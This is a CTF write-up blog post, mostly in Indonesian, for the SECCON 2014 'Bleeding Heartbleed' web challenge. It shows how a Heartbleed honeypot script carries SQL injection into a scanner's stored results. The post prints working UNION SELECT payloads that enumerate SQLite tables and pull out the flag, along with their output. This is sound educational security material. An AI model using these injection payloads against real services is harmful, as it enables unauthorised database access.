---
id: 413
title: 'Seccon CTF 2014: Bleeding “Heartbleed” - Web 300 pts'
date: 2014-12-09T10:15:04+00:00
author: abdilahrf
layout: post
guid: http://www.hasnydes.us/?p=413
permalink: /2014/12/bleeding-heartbleed-test-web-300-pts-seccon-ctf/
category: CTF
tags: [SecconCTF,Web Exploitation]
---
> <http://bleeding.pwn.seccon.jp/>

website check heartbleed , yang datanya di simpan ke database coba kita scan

> 173.194.65.100:443
> 
>     Connecting...
>     Sending Client Hello...
>     Waiting for Server Hello...
>      ... received message: type = 22, ver = 0302, length = 61
>      ... received message: type = 22, ver = 0302, length = 3852
>      ... received message: type = 22, ver = 0302, length = 331
>      ... received message: type = 22, ver = 0302, length = 4
>     Sending heartbeat request...
>     
>     

<!--more-->

view-source

> <pre><span class="pl-c">&lt;!-- DEBUG: INSERT OK. TIME=1417889356 --&gt;
</span></pre>

INSERT OK berarti masuk ke database, sepertinya ini ada sql injection cara kita inject dengan membuat honeypot vulnerability Heartbleed

gunakan script <a href="packetstormsecurity.com/files/126068/hb_honeypot.pl.txt" target="_blank">packetstormsecurity.com/files/126068/hb_honeypot.pl.txt</a> untuk membuat server anda menjadi vuln heartpbleed ,untuk bisa mengirimkan pesan inject nya jalankan honeypot dan scan ip anda

&nbsp;

> ifconfig
> 
> 120.33.21.66
> 
> perl hb_honeypot.pl
> 
> Scan  120.33.21.66:443 < via website
> 
> <span style="text-decoration: underline;">DATABASE ERROR!!!</span> <tt>near ".": syntax error</tt>
> 
> select time from results where result=&#8217;Connecting&#8230; Sending Client Hello&#8230; Waiting for Server Hello&#8230; &#8230; received message: type = 24, ver = 0301, length = 249 &#8230; received message: type = 24, ver = 0301, length = 249 &#8230; received message: type = 24, ver = 0301, length = 249 &#8230; received message: type = 24, ver = 0301, length = 249 &#8230; received message: type = 22, ver = 0301, length = 1 Sending heartbeat request&#8230; &#8230; received message: type = 24, ver = 0301, length = 249
> 
> Received heartbeat response: 09809\*)(\*)(76&^%&(*&^7657332
> 
> Hi there! Your scan has been logged! Have no fear, this is for research only &#8212; We&#8217;re never gonna give you up, never gonna let you down! WARNING: server returned more data than it should &#8211; server is vulnerable! &#8216;;

Kita coba lagi inject

> perl hb_honeypot.pl  &#8216; UNION SELECT 1337 WHERE 1=1 OR &#8216;1&#8217; LIKE &#8216;
> 
> view source
> 
> <span class="pl-c"><!&#8211; DEBUG: INSERT OK. TIME=1337 &#8211;></span>

untuk mendapatkan list table

> perl hb\_honeypot.pl &#8216; UNION SELECT group\_concat(name) FROM sqlite_master WHERE type=&#8217;table&#8217;;&#8211;
> 
> <pre><span class="pl-c">view source
&lt;!-- DEBUG: INSERT OK. TIME=results,ssFLGss,ttDMYtt --&gt;

</span></pre>

ambil kolom flag dari tabel results

> perl hb_honeypot.pl &#8216; UNION SELECT flag from ssFLGss WHERE 1=1 OR &#8216;1&#8217; LIKE &#8216;
> 
> view source
> 
>     <!-- DEBUG: INSERT OK. TIME=SECCON{IknewIt!SQLiteAgain!!!} -->
>     
>     

Other Source :

https://github.com/ctfs/write-ups/tree/master/seccon-ctf-2014/bleeding-heartbleed-test-web

<http://tasteless.eu/2014/12/seccon-ctf-2014-online-qualifications-web300-writeup/>

<div class='et_post_video'>
</div>